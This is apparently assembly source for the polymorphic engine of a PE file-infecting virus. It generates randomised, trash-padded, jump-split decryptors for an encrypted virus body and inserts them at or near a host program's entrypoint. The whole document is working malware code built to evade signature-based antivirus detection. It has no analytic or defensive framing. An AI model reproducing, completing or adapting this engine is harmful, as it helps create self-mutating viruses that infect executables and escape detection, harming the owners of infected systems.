   ; ---------------------------------------------------------------------------

   ; [.CODE]

   ; somewhere at the entrypoint: (sometimes UEP)
   ;   v1. decryptor itself
   ;   v2. call dword ptr [decr_ptr]
   ;   v3. call near ptr decr
   ;   v4. jmp decr

   ; decryptor:
   ;        mov temp1, reg1   |  push reg1       |   randomly
   ;        mov tempN, regN   |  push regN       |   randomly
   ;        mov index, 0
   ;        key1 = key1_c
   ;        key2 = key2_c                  ; decryptor may contain trash (ETG)
   ;        key3 = key3_c
   ; cycle: mov x1, index
   ;        add x1, srcptr                 ; decryptor may be splitted into
   ;        mov t, [x1]                    ; jmp-linked chunks
   ;        cmd1 t, key1
   ;        cmd2 key1, key2
   ;        cmd2 key2, key3                ; < all shown commands are
   ;        mov x2, index                  ; high-level macros, which will be
   ;        add x2, dstptr                 ; converted into low-level opcodes
   ;        mov [x2], t                    ; by means of CODEGEN
   ;        add index, var_4
   ;        cmp index, var_virsize
   ;        jb/jl/jne cycle    | setz r8, mov?x r32, r8, jmp [jtab+r32*4]
   ;        call dword ptr [dstptr]            |    call near ptr dst    }--->mixed
   ;        mov regN, tempN    | pop regN                                \__/
   ;        mov reg1, temp1    | pop reg1                                /

   ;             ...
   ;var_4        dd     4                  ; surely, all variables are located
   ;             ...                       ; in the random places
   ;var_virsize  dd     virsize
   ;        ...
   ; srcptr dd src
   ;        ...
   ; dstptr dd dst
   ;        ...
   ; src    db  xx,yy,zz,...       ; virsize bytes
   ;        ...
   ; key1_c dd  <key1>
   ;        ...
   ; key2_c dd  <key2>
   ;        ...
   ; key3_c dd  <key3>
   ;        ...

   ; [.DATA]

   ;        ...
   ; dst    db  virsize dup (?)            ; all variables are mixed
   ;        ...                            ; in random order
   ; index  dd  ?
   ;        ...
   ; x1     dd  ?
   ;        ...
   ; x2     dd  ?
   ;        ...
   ; t      dd  ?
   ;        ...
   ; temp_1 dd  ?
   ;        ...
   ; temp_2 dd  ?
   ;        ...
   ; temp_3 dd  ?
   ;        ...
   ; key1   dd  ?
   ;        ...
   ; key2   dd  ?
   ;        ...
   ; key3   dd  ?
   ;        ...
   ;

   ; ---------------------------------------------------------------------------

   var_index               equ     1       ; fixed ID's, to be randomly mixed
   var_x1                  equ     2       ;
   var_x2                  equ     3       ;
   var_t                   equ     4       ;
   var_temp0               equ     5       ;
   var_temp1               equ     6       ;
   var_temp2               equ     7       ;
   var_temp3               equ     8       ;
   var_temp4               equ     9       ;
   ID_dst                  equ     10      ;
   var_key1                equ     11      ;
   var_key2                equ     12      ;
   var_key3                equ     13      ;

   num_uninit_vars         equ     13      ; MAX=32

   ID_cycle                equ     14
   ID_decrstart            equ     15
   ID_dd_decrstart         equ     16
   var_srcptr              equ     17
   var_dstptr              equ     18
   ID_src                  equ     19
   var_4                   equ     20
   var_virsize             equ     21
   var_key1_c              equ     22
   var_key2_c              equ     23
   var_key3_c              equ     24
   ID_jmpto                equ     25
   ID_jtab                 equ     26
   ID_jtab_x               equ     27
   ID_link                 equ     28

   ID_free                 equ     29

   mac1                    macro   a,b,c,d
                           push    d
                           push    c
                           push    b
                           push    a
                           call    build
                           endm

   ; ---------------------------------------------------------------------------

   ; returns:      0      --if success
   ;            non-zero  --if error

   ;int __cdecl my_mutate(
   ;            DWORD           user_arg,
   ;            PE_HEADER*      pe,
   ;            PE_OBJENTRY*    oe,
   ;            hooy*           root,
   ;            int    __cdecl  user_disasm(DWORD,BYTE*),
   ;            void*  __cdecl  user_malloc(DWORD,DWORD),
   ;            DWORD  __cdecl  user_random(DWORD,DWORD)
   ;            )

   my_mutate               proc    c

                           arg     user_param
                           arg     pe
                           arg     oe
                           arg     root
                           arg     user_disasm
                           arg     user_malloc
                           arg     user_random

                           local   hooy
                           local   save_esp
                           local   ret_to
                           local   buf_size
                           local   buf_ptr
                           local   z_cmd1
                           local   z_key1
                           local   z_cmd2
                           local   z_key2
                           local   z_cmd3
                           local   z_key3
                           local   regavail
                           local   etgsize
                           local   trasher_on
                           local   calltype
                           local   d_type
                           local   d_count
                           local   d_reg:DWORD:5
                           local   tmp1
                           local   tmp2
                           local   last_id
                           local   jmpprob
                           local   etg_srcreg
                           local   etg_cmd
                           local   etg_maxcmd
                           local   use_3keys

                           pusha
                           cld
                           mov     save_esp, esp

                           mov     eax, user_param
                           mov     [eax].v_saveebp, ebp

                           mov     last_id, ID_free

                           ; disable trash with low prob
                           mov     eax, 10
                           call    random
                           or      eax, eax
                           setnz   al
                           mov     trasher_on, eax

                           ; calc jmp-prob
                           mov     eax, 41
                           call    random
                           cmp     eax, 20
                           jae     __do_jmps
                           xor     eax, eax
   __do_jmps:              mov     jmpprob, eax    ; 20..40

                           ; alloc temp-buf
                           mov     ecx, user_param
                           mov     ecx, [ecx].v_virsize
                           shl     ecx, 1
                           add     ecx, 1024
                           call    malloc
                           mov     buf_ptr, eax

   ;                       int 3

                           nop
                           nop

   ; select encr/decr cmd & key

           mov     eax, 3
           call    random
           inc     eax    ; 1=add 2=sub 3=xor
           mov     z_cmd1, eax

           call    rnd_dword
           mov     z_key1, eax

           mov     eax, 3
           call    random
           inc     eax    ; 1=add 2=sub 3=xor
           mov     z_cmd2, eax

           call    rnd_dword
           mov     z_key2, eax

           mov     eax, 3
           call    random
           inc     eax    ; 1=add 2=sub 3=xor
           mov     z_cmd3, eax

           call    rnd_dword
           mov     z_key3, eax

           mov     eax, 2
           call    random
           mov     use_3keys, eax

   ; init vars
           mov     esi, var_4
           mov     edi, 4
           call    var_alloc_3

           mov     esi, var_virsize
           mov     edi, user_param
           mov     edi, [edi].v_virsize
           call    var_alloc_3

           mov     esi, var_key1_c
           mov     edi, z_key1
           call    var_alloc_3

           mov     esi, var_key2_c
           mov     edi, z_key2
           call    var_alloc_3

           mov     esi, var_key3_c
           mov     edi, z_key3
           call    var_alloc_3

   ; alloc vars
           mov     esi, var_srcptr
           mov     edi, ID_src
           call    var_alloc_1

           mov     esi, var_dstptr
           mov     edi, ID_dst
           call    var_alloc_1

   ; alloc uninit vars, in random order

           xor     edi, edi

           mov     ecx, num_uninit_vars
   cc1:
           mov     eax, num_uninit_vars
           call    random
           bts     edi, eax
           jc      cc1
           lea     esi, [eax+1]

           mov     edx, 4
           cmp     esi, ID_dst
           jnz     cc2
           mov     edx, user_param
           mov     edx, [edx].v_virsize
   cc2:
           call    var_alloc_2
           loop    cc1

   ; CALL decryptor
           call    find_special_hooy

           ; find entry we must return to
           mov     eax, hooy
           mov     eax, [eax].h_next
           mov     ret_to, eax

   ; with some prob, skip CALL decr

           mov     calltype, -1
           mov     eax, 2
           call    random
           or      eax, eax
           jz      do_decr

           mov     eax, 3
           call    random
           mov     calltype, eax
           dec     eax
           jz      call1
           dec     eax
           jz      call2
   call0:
   ; call [dd_decrstart]
           mov     eax, buf_ptr
           mov     [eax].word ptr 0, 15FFh      ; call dword ptr [...]
           mov     buf_size, 2
           call    flush_as_opcode

           call    flush_as_fixup
           mov     [ebx].h_arg1, ID_dd_decrstart

   ; dd_decrstart
           mov     esi, ID_dd_decrstart
           mov     edi, ID_decrstart
           call    var_alloc_1

           jmp     callx
   call1:
           call    out_call
           mov     [ebx].h_arg1, ID_decrstart

           jmp     callx
   call2:
           call    out_jmp
           mov     [ebx].h_arg1, ID_decrstart

           call    flush_label
           mov     [ebx].h_oldrva, ID_jmpto
   callx:

   ; decryptor itself
           call    find_hooy

   do_decr:

           ; decrstart:
           call    flush_label
           mov     [ebx].h_oldrva, ID_decrstart             ; ID

   ;       mov     eax, buf_ptr
   ;       mov     byte ptr [eax], 0cch
   ;       mov     buf_size, 1
   ;       call    flush_as_opcode

   ; select # of regs
           mov     eax, 5-3+1              ; 3..5
           call    random                  ;
           add     eax, 3                  ;
           mov     d_count, eax

   ; select var_tempN or push/pop -usage type
           mov     eax, 3
           call    random
           dec     eax
           jz      t1
           dec     eax
           jz      t2
   t0:     call    rnd_dword
           jmp     tx
   t1:     xor     eax, eax
           jmp     tx
   t2:     or      eax, -1
   tx:     mov     d_type, eax

   ; init trash params
           call    init_etg

   ; alloc & save regs
           mov     regavail, 0

           xor     ebx, ebx

   __c1:   call    getreg
           bt      regavail, eax
           jc      __c1
           mov     d_reg[ebx*4], eax

           mov     esi, eax
           lea     edi, [ebx + var_temp0]
           call    savereg

           call    trasher_avail

           inc     ebx
           cmp     ebx, d_count
           jb      __c1

   ; init consts
           mac1    cmd_v_c, cmd_mov, var_index, 0          ; index=0
           mac1    cmd_v_v, cmd_mov, var_key1, var_key1_c  ; key1 = key1_c
           mac1    cmd_v_v, cmd_mov, var_key2, var_key2_c  ; key2 = key2_c
           cmp     use_3keys, 1
           jne     @@skip3b
           mac1    cmd_v_v, cmd_mov, var_key3, var_key3_c  ; key3 = key3_c
   @@skip3b:

           ; cycle:
           call    flush_label
           mov     [ebx].h_oldrva, ID_cycle                 ; ID

           mac1    cmd_v_v, cmd_mov, var_x1, var_index      ; mov x1, index
           mac1    cmd_v_v, cmd_add, var_x1, var_srcptr     ; add x1, srcptr
           mac1    cmd_v_memv, cmd_mov, var_t, var_x1       ; mov t, [x1]

           mac1    cmd_v_v, z_cmd1, var_t, var_key1         ; z_cmd1 t, var_key1
           mac1    cmd_v_v, z_cmd2, var_key1, var_key2      ; z_cmd2 var_key1, var_key2
           cmp     use_3keys, 1
           jne     @@skip3
           mac1    cmd_v_v, z_cmd3, var_key2, var_key3      ; z_cmd3 var_key2, var_key3
   @@skip3:
           mac1    cmd_v_v, cmd_mov, var_x2, var_index      ; mov x2, index
           mac1    cmd_v_v, cmd_add, var_x2, var_dstptr     ; add x2, dstptr
           mac1    cmd_memv_v, cmd_mov, var_x2, var_t       ; mov [x2], t

           mac1    cmd_v_v, cmd_add, var_index, var_4      ; add index, var_4

           push    trasher_on
           mov     trasher_on, 0

           mac1    cmd_v_v, cmd_cmp, var_index, var_virsize ; cmp index, var_virsize

   ;--------------------

           ; 82 85 8C   JB JL JNE
           mov     eax, 3
           call    random
           dec     eax
           jz      __r1
           dec     eax
           jz      __r2
   __r0:   mov     cl, 02h
           jmp     __rx
   __r1:   mov     cl, 05h
           jmp     __rx
   __r2:   mov     cl, 0Ch
   __rx:

           mov     eax, 2
           call    random
           dec     eax
           jz      __j1

   __j0:
           ; find reg
           xor     esi, esi
   __z2:   mov     edi, d_reg[esi*4]
           cmp     edi, 4
           jb      __z1
           inc     esi
           cmp     esi, d_count
           jb      __z2
           jmp     __j1
   __z1:
           btr     regavail, edi

           mov     ebx, ID_jtab_x
           mov     edx, ID_cycle

           mov     eax, 2
           call    random
           dec     eax
           jz      __o1
           xchg    ebx, edx
           xor     cl, 1
   __o1:
           mov     tmp1, ebx
           mov     tmp2, edx

           ; setxx r8
           mov     edx, buf_ptr
           mov     [edx].byte ptr 0, 0Fh                 ; setxx r8
           or      cl, 090h
           mov     [edx].byte ptr 1, cl
           lea     eax, [edi+0C0h]
           mov     [edx].byte ptr 2, al
           mov     buf_size, 3
           call    flush_as_opcode

           pop     trasher_on

           call    trasher_avail
           call    trasher_avail

           ; mov?x r32, r8

           mov     eax, d_count
           call    random
           mov     esi, d_reg[eax*4]

           btr     regavail, esi

           mov     eax, 2
           call    random
           lea     eax, [0B6h+eax*8]       ; zx/sx

           mov     edx, buf_ptr
           mov     [edx].byte ptr 0, 0Fh
           mov     [edx].byte ptr 1, al
           lea     eax, [0C0h+esi*8+edi]
           mov     [edx].byte ptr 2, al
           mov     buf_size, 3
           call    flush_as_opcode

           cmp     esi, edi
           je      __skip_bts
           bts     regavail, edi
   __skip_bts:

           call    trasher_avail
           call    trasher_avail

           ; jmp dword ptr [jtab+r32*4]
           mov     edx, buf_ptr
           mov     [edx].word ptr 0, 24FFh
           lea     eax, [85h+esi*8]
           mov     [edx].byte ptr 2, al
           mov     buf_size, 3
           call    flush_as_opcode

           call    flush_as_fixup
           mov     [ebx].h_arg1, ID_jtab

           bts     regavail, esi

   ;       push    hooy
           call    find_hooy

           call    flush_label
           mov     [ebx].h_oldrva, ID_jtab

           call    flush_as_fixup
           mov     eax, tmp1
           mov     [ebx].h_arg1, eax
           call    flush_as_fixup
           mov     eax, tmp2
           mov     [ebx].h_arg1, eax

   ;       pop     hooy
   ;       call    trasher_avail

           call    find_hooy

           call    flush_label
           mov     [ebx].h_oldrva, ID_jtab_x

           jmp     __jx
   __j1:
           mov     eax, buf_ptr
           mov     [eax].byte ptr 0, 0Fh                   ; jx cycle
           or      cl, 80h
           mov     [eax].byte ptr 1, cl
           mov     buf_size, 6
           mov     ecx, FL_OPCODE + FL_CODE + FL_HAVEREL + FL_PRESENT + FL_VPRESENT
           call    flush
           mov     [ebx].h_arg1, ID_cycle                  ; ID
           mov     [ebx].h_arg2, 4                         ; arg-size

           pop     trasher_on
   __jx:
           call    trasher_avail


   ; end-of-decryptor stuff
           mov     eax, 2
           call    random
           dec     eax
           jz      new_exit_method

   old_exit_method:

   ; call virstart
           call    do_callvirstart
           call    trasher_avail
   ; restore regs
   ; retn
           call    do_restregs

           jmp     xxx_exit_method_done

   new_exit_method: ; .a

   ; restore regs
   ; retn
           call    do_restregs

           mov     eax, 10
           call    random
           dec     eax
           jz      xxx_exit_method_done    ; skip [call virstart] at all

           dec     eax
           jz      call_do_callvirstart    ; skip [skip some opcodes]

   ; skip some opcodes
           ;;
           mov     ebx, ret_to
           mov     hooy, ebx
   re_skip:

   ;       mov     eax, buf_ptr
   ;       mov     [eax].dword ptr 0, 0cccccccch
   ;       mov     buf_size, 4
   ;       call    flush_as_opcode
   ;       mov     ebx, [ebx].h_next

           test    [ebx].h_flags, FL_HAVEREL
           jz      __norel

           mov     eax, 2
           call    random
           dec     eax
           jz      __norel

           mov     ebx, [ebx].h_arg1

   __norel:
           mov     eax, 4
           call    random
           dec     eax
           jnz     re_skip

   ; call virstart
   call_do_callvirstart:
           call    do_callvirstart

   xxx_exit_method_done:


   ; src
           call    find_hooy

           ; src:
           call    flush_label
           mov     [ebx].h_oldrva, ID_src

           ; db xx,yy,zz,...               ; virsize byte(s)
           mov     edi, buf_ptr
           mov     eax, user_param
           mov     esi, [eax].v_virptr
           mov     ecx, [eax].v_virsize
           mov     buf_size, ecx
           add     ecx, 3
           shr     ecx, 2

           mov     edx, z_key1
           mov     ebx, z_key2

           cld
   @@ccc:  lodsd

           cmp     z_cmd1, cmd_add
           je      @@add1
           cmp     z_cmd1, cmd_sub
           je      @@sub1
   @@xor1: xor     eax, edx ;edx=z_key1
           jmp     @@ok1
   @@add1: sub     eax, edx ;edx=z_key1
           jmp     @@ok1
   @@sub1: add     eax, edx ;edx=z_key1
   @@ok1:
           cmp     z_cmd2, cmd_add
           je      @@add2
           cmp     z_cmd2, cmd_sub
           je      @@sub2
   @@xor2: xor     edx, ebx ;edx=z_key1 ebx=z_key2
           jmp     @@ok2
   @@add2: add     edx, ebx ;edx=z_key1 ebx=z_key2
           jmp     @@ok2
   @@sub2: sub     edx, ebx ;edx=z_key1 ebx=z_key2
   @@ok2:
           cmp     use_3keys, 1
           jne     @@ok3

           cmp     z_cmd3, cmd_add
           je      @@add3
           cmp     z_cmd3, cmd_sub
           je      @@sub3
   @@xor3: xor     ebx, z_key3 ;ebx=z_key2
           jmp     @@ok3
   @@add3: add     ebx, z_key3 ;ebx=z_key2
           jmp     @@ok3
   @@sub3: sub     ebx, z_key3 ;ebx=z_key2
   @@ok3:
           stosd
           loop    @@ccc

           mov     ecx, FL_DATA + FL_PRESENT + FL_VPRESENT
           call    flush

                           nop
                           nop

                           xor     eax, eax        ; 0=SUCCESS
   mutate_exit:            mov     [esp+7*4], eax  ; popa.eax

                           popa
                           ret
                           endp

   mutate_error:           mov     esp, save_esp
                           mov     eax, 1
                           jmp     mutate_exit

   ; ---------------------------------------------------------------------------

   do_callvirstart:
           mov     eax, 3
           call    random
           dec     eax
           jz      __q1

   __q0:   mov     eax, buf_ptr
           mov     [eax].word ptr 0, 15FFh                 ; call dword ptr [...]
           mov     buf_size, 2
           call    flush_as_opcode

           call    flush_as_fixup
           mov     [ebx].h_arg1, var_dstptr

           jmp     __qx

   __q1:   call    out_call                      ; call near ptr dst
           mov     [ebx].h_arg1, ID_dst
   __qx:

           retn


   do_restregs:
           mov     ebx, d_count
   __c2:   dec     ebx

           call    trasher_avail

           mov     esi, d_reg[ebx*4]
           lea     edi, [ebx + var_temp0]
           call    restreg

           or      ebx, ebx
           jnz     __c2

   ; retn
           mov     eax, calltype
           cmp     eax, -1
           je      ret_1
           dec     eax
           jz      ret1
           dec     eax
           jz      ret2
   ret0:
   ret1:   mov     eax, buf_ptr
           mov     [eax].byte ptr 0, 0C3h                  ; retn
           mov     buf_size, 1
           call    flush_as_opcode

           jmp     retx
   ret2:
           call    out_jmp
           mov     [ebx].h_arg1, ID_jmpto

           jmp     retx
   ret_1:
           ; check if we're using decryptor-w/o-call && (jmpprob != 0)
           mov     eax, hooy
           mov     eax, [eax].h_next
           cmp     eax, ret_to
           je      retx

           ; now, fix such situation: decryptor is splitted into parts
           ; and linked with jmp, but there was no CALL decryptor.
           ; so, we must insert additional jmp

           call    out_jmp
           mov     [ebx].h_arg1, ID_link

           mov     ebx, root
   __i1:   mov     hooy, ebx
           mov     ebx, [ebx].h_next
           cmp     ebx, ret_to
           jne     __i1

           call    flush_label
           mov     [ebx].h_oldrva, ID_link
   retx:

           retn

   ; ---------------------------------------------------------------------------

   getreg:
   __rr:                   mov     eax, 8
                           call    random
                           cmp     al, 4  ; esp
                           je      __rr
                           cmp     al, 5  ; ebp
                           je      __rr
                           retn

   ; ---------------------------------------------------------------------------

   savereg:                pusha

                           bt      d_type, esi
                           jc      s1

   s0:                     mov     ecx, buf_ptr
                           lea     eax, [esi + 50h]        ; push reg32
                           mov     [ecx], al
                           mov     buf_size, 1
                           call    flush_as_opcode

                           jmp     sx

   s1:                     mac1    cmd_v_r, cmd_mov, edi, esi

   sx:                     bts     regavail, esi

                           popa
                           retn

   restreg:                pusha

                           btr     regavail, esi

                           bt      d_type, esi
                           jc      r1

   r0:                     mov     ecx, buf_ptr
                           lea     eax, [esi + 58h]        ; pop reg32
                           mov     [ecx], al
                           mov     buf_size, 1
                           call    flush_as_opcode

                           jmp     rx

   r1:                     mac1    cmd_r_v, cmd_mov, esi, edi

   rx:                     popa
                           retn

   ; ---------------------------------------------------------------------------

   var_alloc_1:            call    find_hooy

                           call    flush_label
                           mov     [ebx].h_oldrva, esi

                           call    flush_as_fixup
                           mov     [ebx].h_arg1, edi

                           retn

   var_alloc_3:            call    find_hooy

                           call    flush_label
                           mov     [ebx].h_oldrva, esi

                           mov     eax, buf_ptr
                           mov     [eax], edi
                           mov     buf_size, 4
                           call    flush

                           retn

   ; input: ESI=id, EDX=min size

   var_alloc_2:            pusha

                           call    find_hooy_data

                           call    flush_label
                           mov     [ebx].h_oldrva, esi

                           mov     eax, 2
                           call    random
                           or      eax, eax
                           jz      __skiprnd
                           mov     eax, 1024
                           call    random
   __skiprnd:
                           lea     edx, [edx+eax*4+3]
                           and     dl, not 3

                           mov     buf_size, edx

                           mov     ecx, FL_DATA + FL_VPRESENT
                           call    flush

                           popa
                           retn

   ; ---------------------------------------------------------------------------

   ; input:  ECX=size
   ; output: EAX=ptr

   malloc:                 pusha
                           push    ecx
                           push    user_param
                           call    user_malloc
                           add     esp, 8
                           or      eax, eax
                           jz      mutate_error
                           mov     [esp+7*4], eax  ; popa.eax
                           popa
                           retn

   random:                 pusha
                           push    eax
                           push    user_param
                           call    user_random
                           add     esp, 8
                           mov     [esp+7*4], eax  ; popa.eax
                           popa
                           or      eax, eax
                           retn

   rndb:                   mov     eax, 254
                           call    random
                           inc     eax
                           retn

   rnd_dword:              push    eax
                           call    rndb
                           mov     [esp+2], al
                           call    rndb
                           mov     [esp+0], al
                           call    rndb
                           mov     [esp+1], al
                           call    rndb
                           mov     [esp+3], al
                           pop     eax
                           retn

   ; ---------------------------------------------------------------------------

   find_hooy:              pusha

   ; count # of good entries
                           xor     ecx, ecx        ; count

                           mov     esi, root

   __cycle1:               test    [esi].h_flags, FL_STOP
                           jz      __cont1
                           mov     eax, [esi].h_next
                           test    [eax].h_flags, FL_FIXUP
                           jnz     __cont1

                           inc     ecx             ; count++

   __cont1:                mov     esi, [esi].h_next
                           or      esi, esi
                           jnz     __cycle1

   ; check if no good entries available
                           or      ecx, ecx
                           jz      mutate_error

   ; select random entry
                           xchg    ecx, eax
                           call    random
                           xchg    ecx, eax

   ; seek selected entry
                           mov     esi, root

   __cycle2:               test    [esi].h_flags, FL_STOP
                           jz      __cont2
                           mov     eax, [esi].h_next
                           test    [eax].h_flags, FL_FIXUP
                           jnz     __cont2

                           dec     ecx             ; count++
                           jle     __done

   __cont2:                mov     esi, [esi].h_next
                           or      esi, esi
                           jnz     __cycle2
   __done:
                           mov     hooy, esi

                           popa
                           retn

   ; ---------------------------------------------------------------------------

   find_hooy_data:         pusha

                           ;;
                           mov     eax, oe

                           mov     ecx, pe
                           movzx   ecx, [ecx].pe_numofobjects

   __ccc:                  cmp     [eax].oe_flags, 0C0000040h  ; seek .data
                           je      __ddd

                           add     eax, 28h        ; oe
                           loop    __ccc
                           jmp     mutate_error

   __ddd:
                           mov     ebx, [eax].oe_virt_size
                           or      ebx, ebx
                           jnz     __eee
                           mov     ebx, [eax].oe_phys_size
   __eee:                  add     ebx, [eax].oe_virt_rva
                           ;;

                           mov     esi, root
   __cycle:                cmp     [esi].h_oldrva, ebx
                           jb      __cnt
                           test    [esi].h_flags, FL_SECTALIGN
                           jz      __cnt

                           popa
                           retn

   __cnt:                  mov     hooy, esi

                           mov     esi, [esi].h_next
                           or      esi, esi
                           jnz     __cycle
                           jmp     mutate_error

   ; ---------------------------------------------------------------------------

   ; action: find entry near the entrypoint, to insert decryptor or
   ; <call/jmp decryptor> into
   ;
   ; with some prob, we're ignoring entrypoint and performing UEP insertion

   find_special_hooy:      pusha

                           mov     eax, 5
                           call    random
                           or      eax, eax
                           jz      @@uep

                           xor     edi, edi        ; 0/1
                           mov     esi, root
   @@cycle1:
                           or      edi, edi
                           jnz     @@x1
                           mov     eax, pe
                           mov     eax, [eax].pe_entrypointrva
                           cmp     [esi].h_oldrva, eax
                           jne     @@x1
                           test    [esi].h_flags, FL_OPCODE
                           jz      @@x1
                           inc     edi
   @@x1:
                           or      edi, edi
                           jz      @@x2
                           test    [esi].h_flags, FL_OPCODE
                           jz      @@x2

                           mov     eax, [esi].h_next
                           test    [eax].h_flags, FL_HAVEREL + FL_FIXUP ; will fail on ADC/SBB
                           jnz     @@x2

                           mov     edx, 8

   @@4:                    test    [eax].h_flags, FL_STOP
                           jnz     @@x3
                           mov     eax, [eax].h_next

                           dec     edx
                           jnz     @@4

   @@x2:                   mov     esi, [esi].h_next
                           or      esi, esi
                           jnz     @@cycle1
                           jmp     mutate_error
   @@x3:
                           mov     hooy, esi

                           popa
                           retn

   @@uep:                  xor     ecx, ecx        ; count

                           mov     esi, root

   __cycle1:               test    [esi].h_flags, FL_OPCODE
                           jz      __cont1
                           mov     eax, [esi].h_next
                           test    [eax].h_flags, FL_OPCODE
                           jz      __cont1

                           inc     ecx             ; count++

   __cont1:                mov     esi, [esi].h_next
                           or      esi, esi
                           jnz     __cycle1

                           or      ecx, ecx
                           jz      mutate_error

                           mov     eax, ecx
                           call    random
                           mov     ecx, eax

                           mov     esi, root

   __cycle2:               test    [esi].h_flags, FL_OPCODE
                           jz      __cont2
                           mov     eax, [esi].h_next
                           test    [eax].h_flags, FL_OPCODE
                           jz      __cont2

                           dec     ecx             ; count++
                           jle     __done

   __cont2:                mov     esi, [esi].h_next
                           or      esi, esi
                           jnz     __cycle2

   __done:                 mov     hooy, esi

                           popa
                           retn


   ; ---------------------------------------------------------------------------

   build:                  pusha

                           push    dword ptr [esp+32+16]      ; x4
                           push    dword ptr [esp+32+12] +4   ; x3
                           push    dword ptr [esp+32+8]  +8   ; x2
                           push    dword ptr [esp+32+4]  +12  ; x1
                           push    user_random             ; random()
                           pusho   my_trash                ; trash()
                           pusho   my_fixup                ; fixup()
                           push    regavail                ; reg set
                           lea     eax, buf_size
                           push    eax                     ; outbufsize
                           push    buf_ptr                 ; bufptr
                           push    user_param              ; user-param
                           call    codegen
                           add     esp, 11*4

                           cmp     buf_size, 0
                           jne     cg_err

                           popa
                           retn    4*4

   cg_err:                 int 3
                           int 3
                           jmp     cg_err

   my_trash:               pusha
                           mov     ebp, [esp+32+4]
                           mov     ebp, [ebp].v_saveebp

                           mov     eax, [esp+32+8]    ; outptr
                           sub     eax, buf_ptr
                           jz      __skip1
                           mov     buf_size, eax

                           call    flush_as_opcode

   __skip1:
                           mov     ecx, [esp+32+12]   ; regfree
                           call    trasher

                           mov     eax, buf_ptr
                           mov     [esp+7*4], eax  ; popa.eax

                           popa
                           retn

   ; input: ECX=regset

   trasher_avail:          mov     ecx, regavail

   trasher:                pusha

                           or      ecx, ecx
                           jz      __retn
                           cmp     trasher_on, 1
                           jne     __retn

                           mov     edi, buf_ptr

   ;                       mov     al, 90h
   ;                       stosb
                           ;;

                           mov     eax, etg_maxcmd ; calc # of commands
                           call    random
                           inc     eax

                           pusho   my_random       ; external subroutine: rnd
                           push    edi             ; ptr to output buffer
                           push    1024            ; max size of buffer
                           push    eax             ; max number of commands
                           lea     eax, etgsize
                           push    eax             ; ptr to generated bufsize
                           push    ecx ; regfree   ; REG_xxx (dest)
                           push    etg_srcreg      ; REG_xxx (src)
                           push    etg_cmd         ; ETG_xxx (cmd)
                           push    user_param      ; user_param
                           call    etg_engine
                           add     esp, 9*4
                           add     edi, etgsize
                           ;;

                           sub     edi, buf_ptr
                           mov     buf_size, edi

                           call    flush_as_opcode

                           call    try_jmp

   __retn:                 popa
                           retn

   try_jmp:                pusha

                           mov     eax, jmpprob
                           or      eax, eax
                           jz      __skipj
                           call    random
                           jnz     __skipj

                           mov     esi, last_id
                           inc     last_id

                           call    out_jmp
                           mov     [ebx].h_arg1, esi

                           call    find_hooy

                           call    flush_label
                           mov     [ebx].h_oldrva, esi
   __skipj:
                           popa
                           retn

   my_fixup:               pusha
                           mov     ebp, [esp+32+4]
                           mov     ebp, [ebp].v_saveebp

                           mov     eax, [esp+32+8]    ; outptr
                           sub     eax, buf_ptr
                           mov     buf_size, eax

                           call    flush_as_opcode

                           mov     edi, buf_ptr
                           mov     eax, [esp+32+12]   ; fixup's value
                           stosd

                           call    flush_as_fixup

                           mov     eax, buf_ptr
                           mov     [esp+7*4], eax     ; popa.eax

                           popa
                           retn

   ; ---------------------------------------------------------------------------

   ; input: buf_ptr, buf_size

   flush_as_opcode:        mov     ecx, FL_OPCODE + FL_CODE + FL_PRESENT + FL_VPRESENT
                           jmp     flush

   ; input: buf_ptr, buf_size, EAX=fixup's value

   flush_as_fixup:         mov     ecx, FL_FIXUP + FL_CODE + FL_PRESENT + FL_VPRESENT
                           mov     buf_size, 4
                           call    flush
                           mov     [ebx].h_arg1, eax
                           retn

   flush:                  pusha

                           mov     ecx, size hooy_struc
                           call    malloc
                           xchg    ebx, eax

                           mov     ecx, [esp+6*4]  ; pusha.ecx
                           mov     [ebx].h_flags, ecx

                           mov     ecx, buf_size

                           mov     [ebx].h_datalen, ecx
                           mov     [ebx].h_dataptr, ecx

                           or      ecx, ecx
                           jz      __skip1

                           call    malloc
                           xchg    edi, eax

                           mov     [ebx].h_dataptr, edi

                           mov     esi, buf_ptr
                           cld
                           rep     movsb

   __skip1:                mov     eax, hooy
                           mov     ecx, [eax].h_next
                           mov     [ebx].h_next, ecx
                           mov     [eax].h_next, ebx
                           mov     hooy, ebx

                           mov     [esp+4*4], ebx          ; popa.ebx

                           popa
                           retn

   ; ---------------------------------------------------------------------------

   out_jmp:                mov     eax, buf_ptr
                           mov     [eax].byte ptr 0, 0E9h
   out_5:                  mov     buf_size, 5
                           mov     ecx, FL_OPCODE + FL_CODE + FL_HAVEREL + FL_PRESENT + FL_VPRESENT
                           call    flush
                           mov     [ebx].h_arg2, 4
                           retn

   out_call:               mov     eax, buf_ptr
                           mov     [eax].byte ptr 0, 0E8h
                           jmp     out_5

   flush_label:            mov     buf_size, 0
                           mov     ecx, FL_LABEL + FL_CREF + FL_PRESENT + FL_VPRESENT
                           call    flush
                           retn

   ; ---------------------------------------------------------------------------

   init_etg:               pusha

                           ; select trash cmd set
   __rr1:                  mov     etg_cmd, ETG_ALL-ETG_SEG
                           mov     eax, 2
                           call    random
                           dec     eax
                           jz      __rr2           ; v1: all set
                           call    rnd_dword       ; v0: random set
                           and     etg_cmd, eax
                           jz      __rr1
   __rr2:
                           ; trash: select src regs set
   __xx1:                  mov     etg_srcreg, REG_ALL
                           mov     eax, 2
                           call    random
                           dec     eax
                           jz      __xx2
                           call    rnd_dword          ; v1: random set
                           and     etg_srcreg, eax
                           jz      __xx1
   __xx2:
                           ; trash: max # of commands per chunk
                           mov     eax, 6-2+1  ; 2..6
                           call    random      ;
                           add     eax, 2      ;
                           mov     etg_maxcmd, eax

                           popa
                           retn

   ; ---------------------------------------------------------------------------
